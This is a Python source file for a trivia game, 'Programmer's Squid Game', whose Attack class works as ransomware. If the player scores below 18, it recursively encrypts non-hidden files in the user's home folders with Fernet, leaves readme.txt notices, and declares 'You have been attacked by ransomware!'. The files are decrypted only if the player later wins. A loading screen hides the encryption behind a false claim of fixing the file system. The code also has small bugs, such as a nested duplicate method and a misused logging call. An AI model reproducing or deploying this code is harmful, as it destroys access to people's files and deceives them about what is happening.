"""
Programmer's Squid Game

A Python-based trivia game inspired by "Squid Game." Players answer programming questions, and based on their score, files are either encrypted or decrypted.

Features:
- Trivia questions from a JSON file.
- File encryption/decryption using Fernet.
- GUI with customtkinter.
- Event logging.

Modules:
- json, os, stat, sys, logging, customtkinter, cryptography.fernet, tkinter.

Classes:
- Attack: Handles file operations.
- WelcomeFrame: Welcome screen.
- LoaderScreen: Loading screen with progress bar.
- RadioButtonFrame: Manages trivia options.
- TriviaFrame: Trivia game logic and UI.
- App: Main application class.

Usage:
Run main.py to start the game. Answer trivia questions to avoid file encryption or decrypt previously encrypted files.

Note:
Ensure the data directory contains data.json and thinking.png.
"""
import json
import os
import stat
import sys
import logging
import customtkinter as ctk

from cryptography.fernet import Fernet
from tkinter import PhotoImage


########## Welcome to Programmer's Squid game ##########
# welcome_text = pyfiglet.figlet_format(" Programmer's Squid game.")
welcome_text = "Programmer's Squid game"
# Load data
with open("data/data.json", "r") as f:
    data = json.load(f)

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

class Attack:
    
    def __init__(self):
        self.key = None
        self.files = set()

    def list_files(self, directory):
        """
        Recursively lists files in a given directory and adds them to a set if they meet certain criteria.
        Args:
            directory (str): The directory path to list files from.
        Raises:
            Exception: Logs any exception that occurs during the listing of files.
        Criteria for adding files to the set:
            - The file is not named "readme.txt" or "thekey.key".
            - On Windows systems, the file is not hidden or a system file.
            - On non-Windows systems, the file does not start with a '.'.
            - The file size is less than or equal to 100MB (104857600 bytes).
        """
        
        try:
            logging.info(f"{directory}")
            for file in os.listdir(directory):
                logging.info(f"{file}")
                path = os.path.join(directory, file)
                if os.path.isdir(path):
                    self.list_files(path)
                elif os.path.isfile(path):
                    if file not in ["readme.txt", "thekey.key"]:
                        # Checking if the system is of windows and then check if a file is hidden. if hidden pass else add to set 
                        if sys.platform == "win32":
                            if not bool(os.stat(path).st_file_attributes & (stat.FILE_ATTRIBUTE_HIDDEN | stat.FILE_ATTRIBUTE_SYSTEM)):
                                if os.path.getsize(path) <= 104857600:
                                    self.files.add(path)
                                    logging.info(f"File {path} added to list")

                        else:
                            # For other systems(UNIX) checking if the file starts with '.' and skip else add to set
                            if not str(file).startswith("."):
                                if os.path.getsize(path) <= 104857600:
                                    self.files.add(path)
                                    logging.info(f"File {path} added to list")
                
        except Exception:
            logging.exception(f"Error listing files in directory {directory}")
            pass

    def generate_key(self):
        """
        Generates a new encryption key using Fernet, stores it in the instance variable `self.key`,
        and saves it to a JSON file named 'data.json'.
        The generated key is also added to the `data` dictionary with the key "key".
        Raises:
            IOError: If there is an error writing to 'data.json'.
        """

        logging.info("Generating key...")
        self.key = Fernet.generate_key()
        logging.info(f"{self.key}")
        data["key"] = str(self.key)
        with open('data/data.json', 'w') as file:
            json.dump(data, file, indent=4)

    def encrypt_files(self, frame = None, master=None):
        def encrypt_files(self, frame=None, master=None):
            """
            Encrypts files in specified folders and updates the UI progress bar.
            This method performs the following steps:
            1. Generates an encryption key.
            2. Lists all files in the specified folders.
            3. Encrypts each file using the generated key.
            4. Updates the progress bar in the UI.
            5. Creates a readme file in each folder with information about the encryption.
            Args:
                frame (optional): The UI frame containing the progress bar and summary label.
                master (optional): The master UI object to update the UI tasks.
            Raises:
                Exception: If there is an error encrypting a file or creating a readme file.
            """
        
        # Generate a key
        self.generate_key()

        # List all the files in the folders
        for folder in data["folders"]:
            self.list_files(os.path.join(os.path.expanduser("~"), folder))
        logging.info(f"{len(self.files)} files found.")

        # Encrypt the files
        for index, file in enumerate(self.files):
            logging.info(f"Encrypting file: {file}")
            try:
                with open(file, "rb") as f:
                    contents = f.read()
                    contents_encrypted = Fernet(self.key).encrypt(contents)
                with open(file, "wb") as f:
                    f.write(contents_encrypted)
                logging.info("File encrypted successfully.")
            except Exception:
                logging(f"Error encrypting file {file}")
                continue
            
            # Update the progress bar
            if frame:
                progress = (index + 1) / len(self.files)
                frame.progressbar.set(progress)
                master.update_idletasks()
            if index+1 == len(self.files):
                frame.summary.configure(text="All done!", font=ctk.CTkFont(size=20), text_color="green")
                frame.next_button.grid(padx=20, pady=(0, 40), sticky="n")
                frame.next_button.configure(
                    command=lambda: master.show_frame(
                        frame,
                        master.notice_screen, 
                        title="You have been attacked by ransomware!", 
                        summary=f"Affected folders: {', '.join(data['folders'])}.\n\nThis is due to not scoring the desired score of 18. Your files will stay encrypted until you play the game again and achieve the required marks. Do not tamper with the files in the affected folders as they might not be able to be decrypted. For more information, read the 'readme.txt' file in the affected folders."
                    )
                )

        # Create a readme file in each folder
        for path in data["folders"]:
            try:
                with open(os.path.expanduser("~") + "/" + path + "/" + "readme.txt", "w") as f:
                    f.write(data["readme_context"])
                logging.info(f"Creating readme file in {os.path.expanduser("~") + path}")
            except Exception:
                logging.exception("Error creating readme file")
                continue
    
    def decrypt_files(self, frame=None, master=None):
        """
        Decrypts files listed in the specified folders using a key from the data dictionary.
        Args:
            frame (optional): The frame object for updating the progress bar and UI elements.
            master (optional): The master object for updating the UI and showing the next frame.
        Functionality:
            - Reads the encryption key from the data dictionary.
            - Lists all files in the specified folders.
            - Decrypts each file using the Fernet encryption.
            - Updates the progress bar and UI elements during the decryption process.
            - Removes the readme file and the key file after decryption.
        Logging:
            - Logs the decryption process for each file.
            - Logs any errors encountered during decryption or file removal.
        Raises:
            Exception: If there is an error during file decryption or removal.
        """

        # Read the key file
        key = bytes(data["key"][2:-1], "utf-8")

        # List all the files in the folders
        for folder in data["folders"]:
            self.list_files(os.path.join(os.path.expanduser("~"), folder))

        # Decrypt the files
        for index, file in enumerate(self.files):
            logging.info(f"Decrypting file: {file}")
            try:
                with open(file, "rb") as f:
                    contents = f.read()
                    contents_decrypted = Fernet(key).decrypt(contents)
                with open(file, "wb") as f:
                    f.write(contents_decrypted)
                logging.info("File decrypted successfully.")
            except Exception:
                logging.exception(f"Error decrypting file {file}")
                continue
            if frame:
                progress = (index + 1) / len(self.files)
                frame.progressbar.set(progress)
                master.update_idletasks()
            if index+1 == len(self.files):
                frame.summary.configure(text="All done!", font=ctk.CTkFont(size=20), text_color="green", justify="center")
                frame.next_button.grid(padx=20, pady=(0, 40), sticky="n")
                frame.next_button.configure(
                    command=lambda: master.show_frame(
                        frame, 
                        master.notice_screen, 
                        title="Files Decrypted Successfully!", 
                        summary="Congratulations! You have achieved the desired score. Your files have been decrypted successfully."
                    )
                )
        # Remove the readme file and the key file
        for path in data["folders"]:
            try:
                os.remove(os.path.expanduser("~") + "/" + path + "/" + "readme.txt")
                logging.info(f"Removing readme file in {path}")
            except Exception:
                logging.exception("Error removing readme file")
                continue
            try:
                data["key"] = None
                with open('data/data.json', 'w') as file:
                    json.dump(data, file, indent=4)
                logging.info("Deleting key...")
            except Exception:
                logging.exception("Error removing key")
                continue

class WelcomeFrame(ctk.CTkFrame):
    def __init__(self, master, **kwargs):
        super().__init__(master,**kwargs)

        self.welcome_label = ctk.CTkLabel(self, text=welcome_text, width=200, height=100, font=ctk.CTkFont("Times", 40, 'bold'), justify="center", wraplength=500)
        self.welcome_label.grid(row=0, column=0, padx=40, pady=(10, 10), sticky="s")

        self.continue_button = ctk.CTkButton(self, text="Continue", command=lambda: master.show_frame(self, master.trivia_screen), font=ctk.CTkFont(size=20, weight="bold"), height=60, width=160)
        self.continue_button.grid(row=2, column=0, padx=20, pady=(0, 40), sticky="n")

        self.grid_rowconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)
        self.grid_columnconfigure(0, weight=1)


class LoaderScreen(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.grid_rowconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)
        self.grid_columnconfigure(0, weight=1)

        self.title = ctk.CTkLabel(self, font=ctk.CTkFont(size=30))
        self.title.grid(row=0)

        self.progressbar = ctk.CTkProgressBar(self, orientation="horizontal")
        self.progressbar.grid(row=1, padx=50, pady=(0, 0), sticky="ew")

        self.summary = ctk.CTkLabel(self, font=ctk.CTkFont(size=15), wraplength=500)
        self.summary.grid(pady=(0, 80), sticky="nsew")

        self.next_button = ctk.CTkButton(self, text="Continue", font=ctk.CTkFont(size=15, weight="bold"), height=50, width=150)

    def update_args(self, **kwargs):
        """
        Update the arguments for the title and summary.
        This method updates the text of the title and summary widgets
        based on the keyword arguments provided.
        Args:
            **kwargs: Arbitrary keyword arguments. Supported keys are:
                - title (str): The new text for the title widget.
                - summary (str): The new text for the summary widget.
        """

        self.title.configure(text=kwargs.get("title", None))
        self.summary.configure(text=kwargs.get("summary", None))


class RadioButtonFrame(ctk.CTkFrame):
    def __init__(self, master, values, **kwargs):
        super().__init__(master)

        self.grid_columnconfigure(0, weight=1)
        self.values = values
        self.variable = ctk.StringVar(value="")
        self.buttons = []

        for i, value in enumerate(self.values):
            radiobutton = ctk.CTkRadioButton(self, text=self.values[value], variable=self.variable, value=value, height=50, font=ctk.CTkFont(size=18))
            radiobutton.grid(row=i, column=0, padx=10, pady=(10, 0), sticky="ew")
            self.buttons.append(radiobutton)


    def update_options(self, options):
        """
        Updates the options displayed by destroying existing buttons and creating new radio buttons.
        Args:
            options (dict): A dictionary where keys are the values for the radio buttons and values are the text to be displayed on the buttons.
        Returns:
            None
        """

        for button in self.buttons:
            button.destroy()
        self.buttons = []
        for i, value in enumerate(options):
            radiobutton = ctk.CTkRadioButton(self, text=options[value], variable=self.variable, value=value, height=50, font=ctk.CTkFont(size=18))
            radiobutton.grid(row=i, column=0, padx=10, pady=(10, 0), sticky="ew")
            self.set("")
            self.buttons.append(radiobutton)

    def get(self):
        """
        Retrieve the value of the variable.
        Returns:
            The value stored in the variable.
        """

        return self.variable.get()
    
    def set(self, value):
        """
        Sets the value of the variable.
        Parameters:
        value (any): The value to set for the variable.
        """

        self.variable.set(value)

class TriviaFrame(ctk.CTkFrame):
    def __init__(self, master, data):
        super().__init__(master)

        self.master = master

        self.grid_rowconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)
        self.grid_columnconfigure(0, weight=1)

        self.score = 0
        self._data = data
        self._qtn_num = 1

        self.scores = ctk.CTkLabel(self, text=f"Score: {self.score}", font=ctk.CTkFont(size=22))
        self.scores.grid(row=0, column=0, padx=10, pady=(10, 0), sticky="sew")

        self.progress_text = ctk.CTkLabel(self, text=f"{self._qtn_num}/{len(self._data)}", font=ctk.CTkFont(size=15))
        self.progress_text.grid(row=1, sticky="sew")

        self.progressbar = ctk.CTkProgressBar(self, orientation="horizontal")
        self.progressbar.grid(row= 2, column=0, padx=20, pady=(0, 20), sticky="ew")
        progress = (self._qtn_num) / len(self._data)
        self.progressbar.set(progress)

        self.question = ctk.CTkLabel(self, text=self._data[str(self._qtn_num)]["question"], font=ctk.CTkFont(size=16), wraplength=300)
        self.question.grid(row=3, column=0, padx=10, pady=(10, 0), sticky="nsew")

        self.options = RadioButtonFrame(self, self._data[str(self._qtn_num)]["answers"], height=400)
        self.options.grid(row=4, column=0, padx=20, pady=(10, 20), sticky="ns")

        self.feedback_label = ctk.CTkLabel(self, text=None, text_color="green")
        self.feedback_label.grid(row=5, column=0, sticky="new")

        self.submit_btn = ctk.CTkButton(self, text="Next", command=self.next_callback, font=ctk.CTkFont(size=20, weight="bold"), height=50, width=160)
        self.submit_btn.grid(row=6, column=0, padx=20, pady=(10, 20), sticky="n")

    def next_callback(self):
        """
        Handles the logic for progressing to the next question in the quiz game.
        This method checks if the selected answer is correct, updates the score, 
        provides feedback to the user, and progresses to the next question. 
        If the quiz is completed, it checks the score and either encrypts or decrypts 
        files based on the user's performance.
        Steps:
        1. Check if the selected answer is correct and update the score.
        2. Provide feedback to the user.
        3. Check if there are more questions to display.
        4. If the quiz is completed:
            - If the score is less than 18:
                - If files are not already encrypted, encrypt them and show the encryption screen.
                - If files are already encrypted, show a notice screen.
            - If the score is 18 or more:
                - If files are encrypted, decrypt them and show the decryption screen.
                - If files are not encrypted, show a congratulatory notice screen.
        5. Update the score display, progress text, and progress bar.
        6. Load the next question and its options.
        Note:
        - The method assumes that `self._data` contains the quiz data in a specific format.
        - The method interacts with the `self.master` object to show different screens.
        - The `Attack` class is used to handle file encryption and decryption.
        Raises:
        - KeyError: If the question number exceeds the length of the questions.
        """

        if self.options.get() == self._data[str(self._qtn_num)]["correct"]:
            self.score += 1
            self.feedback_label.configure(text="Correct!")
        else:
            self.feedback_label.configure(text="Wrong!", text_color="red")

        # check if the question number doesn't exceed the length of the questions
        if self._qtn_num < len(self._data):
            self._qtn_num += 1
        else:
            if self.score < 18:
                if not data["key"]:
                    logging.info("You failed the game. You will be attacked by ransomware.")
                    logging.info("Your files will be encrypted.")
                    logging.info("Read the readme.txt file in each folder to get the instructions. eng Downloads and Documents folder")
                    frame = self.master.show_frame(self, self.master.loader_screen, title="OPPS", summary="Don't close the window as the application is solving issues with its file system, please give a bit time")  # Show the encrypt screen first
                    self.master.update_idletasks()  # Ensure the screen is updated
                    Attack().encrypt_files(frame, self.master)
                else:
                    logging.info("Your files will stay encrypted untill you get the wanted score.")
                    self.master.show_frame(
                        self,
                        self.master.notice_screen, 
                        title="Files Already Encrypted!", 
                        summary=(
                            f"Affected folders: {', '.join(data['folders'])}.\n\n"
                            "Your files are already encrypted due to not scoring the desired score of 18. "
                            "Please play the game again and achieve the required marks to decrypt your files. "
                            "Do not tamper with the files in the affected folders as they might not be able to be decrypted. "
                            "For more information, read the 'readme.txt' file in the affected folders."
                        )
                    )
            else:
                logging.info("You won the game. Congratulations!")
                logging.info("You will be rewarded with 1 million dollars.")
                if data["key"]:
                    frame = self.master.show_frame(self, self.master.loader_screen, title="Decrypting affected files.", summary="Please don't close the window or interfere with the affected files as this might conflict the decryption process.")  # Show the encrypt screen first
                    self.master.update_idletasks()  # Ensure the screen is updated
                    Attack().decrypt_files(frame, self.master)
                    logging.info("Your files have been decrypted.")
                else:
                    self.master.show_frame(
                        self,
                        self.master.notice_screen, 
                        title="Congratulations!", 
                        summary=(
                            "You have achieved the desired score and won the game! "
                            "Your files were never encrypted. "
                            "Enjoy your victory and the reward of 1 million dollars!"
                        )
                    )
        
        self.scores.configure(text=f"Score: {self.score}")
        self.progress_text.configure(text=f"{self._qtn_num}/{len(self._data)}")
        self.question.configure(text=self._data[str(self._qtn_num)]["question"], wraplength=self.winfo_width())
        self.options.update_options(self._data[str(self._qtn_num)]["answers"])

        progress = (self._qtn_num) / len(self._data)
        self.progressbar.set(progress)

        # You can add logic here to load the next question or end the quiz
        # For now, it just prints the selected answer
        # print(f"Selected answer: {self.radiobutton_frame.get()}")




class App(ctk.CTk):
    def __init__(self, **kwargs): 
        super().__init__()

        self.title("Programmer's Squid game")
        self.geometry("600x600")
        self.grid_rowconfigure(0, weight=1)  # configure grid system
        self.grid_columnconfigure(0, weight=1)
        icon = PhotoImage(file="data/thinking.png")
        self.iconphoto(False, icon)

        self.welcome_screen = WelcomeFrame(self)
        self.trivia_screen = TriviaFrame(self, data["questions"])
        self.loader_screen = LoaderScreen(self)

        self.notice_screen = LoaderScreen(self)
        self.notice_screen.progressbar.grid_forget()
        self.notice_screen.next_button.grid(padx=20, pady=(0, 40), sticky="n")
        self.notice_screen.next_button.configure(command=lambda: self.show_frame(self.notice_screen, self.trivia_screen))
        self.notice_screen.next_button.configure(text="Play Again")

        self.show_frame(None, self.welcome_screen)

    def show_frame(self, forget_frame, frame, **kwargs):
        """
        Changes the currently displayed frame to a new frame.
        Parameters:
        forget_frame (tk.Frame): The frame to be hidden.
        frame (tk.Frame): The frame to be displayed.
        **kwargs: Additional arguments to be passed to the new frame's update_args method.
        Returns:
        tk.Frame: The frame that is now being displayed.
        """

        logging.info(f"Changing frame to {frame}")
        if forget_frame:
            forget_frame.grid_forget()

        self.reset()
        if kwargs:
            frame.update_args(**kwargs)
        frame.grid(row=0, column=0, padx=0, pady=0, sticky="nsew")
        return frame
    
    def reset(self):
        """
        Resets the game by initializing and configuring the various screens.
        This method sets up the welcome screen, trivia screen with questions,
        loader screen, and notice screen. It also configures the notice screen's
        progress bar and next button to transition to the trivia screen when clicked.
        """

        self.welcome_screen = WelcomeFrame(self)
        self.trivia_screen = TriviaFrame(self, data["questions"])
        self.loader_screen = LoaderScreen(self)

        self.notice_screen = LoaderScreen(self)
        self.notice_screen.progressbar.grid_forget()
        self.notice_screen.next_button.grid(padx=20, pady=(0, 40), sticky="n")
        self.notice_screen.next_button.configure(command=lambda: self.show_frame(self.notice_screen, self.trivia_screen))
        self.notice_screen.next_button.configure(text="Play Again")



if __name__ == "__main__":
    logging.basicConfig(
    filename="data/squidgamelog.log",
    encoding="utf-8",
    filemode="a",
    format="{asctime} - {levelname} - {message}",
    style="{",
    datefmt="%Y-%m-%d %H:%M",
    level=logging.INFO
)

    logging.info("Starting Application...")
    app = App()
    app.mainloop()
    logging.info("Closing Application")